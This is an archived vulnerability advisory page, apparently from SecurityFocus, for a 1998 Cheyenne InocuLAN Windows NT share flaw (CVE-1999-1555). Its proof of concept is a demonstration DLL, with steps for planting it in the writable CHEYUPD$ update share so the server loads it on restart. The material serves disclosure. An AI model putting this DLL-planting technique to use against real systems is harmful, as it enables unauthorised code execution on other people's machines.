@@ -1,0 +1,98 @@
+<p><b><span style="font-size: 18pt;">Cheyenne InocuLAN Windows NT Share Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/106/info">info</a><br><a href="http://www.securityfocus.com/bid/106/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/106/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/106/solution">solution</a><br><a href="http://www.securityfocus.com/bid/106/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				106
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Unknown
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-1999-1555<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jun 10 1998 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 11 2009 12:16AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				This vulnerability was found by Paul Boyer &lt;p__boyer@usa.net&gt; and
+reported to the BugTraq mailing list.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Cheyenne Inoculan for Windows NT 4.0 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	inoctroj.cpp:<br/>-------Cut here -----------<br/>#include "stdio.h"<br/><br/>long  __stdcall DllMain (long, unsigned long, void*)<br/>{<br/>// Any code can goes here. This is an exemple<br/>// What it does is simply create a file on C: drive root directory<br/>// and writing "hello world !" inside of it<br/>        FILE * demo;<br/><br/>// create a file<br/>    demo = fopen ( "C:\\I_can_write_a_file.txt", "w");<br/><br/>// write to the file<br/>    char * buf = "hello world !      ";<br/>        fwrite (        buf,1, 15, demo);<br/>        fclose ( demo );<br/><br/>// This aborts the DLL loading. Anyway, we're done at that time ;))<br/>        return 0; <br/>}<br/><br/>-------Cut here -----------<br/><br/>Compile and link to make the target avh32dll.dll. Write it to <br/>&amp;lt;NtBox&amp;gt;\CHEYUPD$\English\NtIntel\Ready\, touch <br/>&amp;lt;NtBox&amp;gt;\CHEYUPD$\English\NtIntel\Ready\filelist.txt to be newer<br/>that it currently is. Wait for the user to stop and restart the InnocuLAN <br/>server, or for them to reboot.
+	
+		<ul>
+</ul>
+</div>
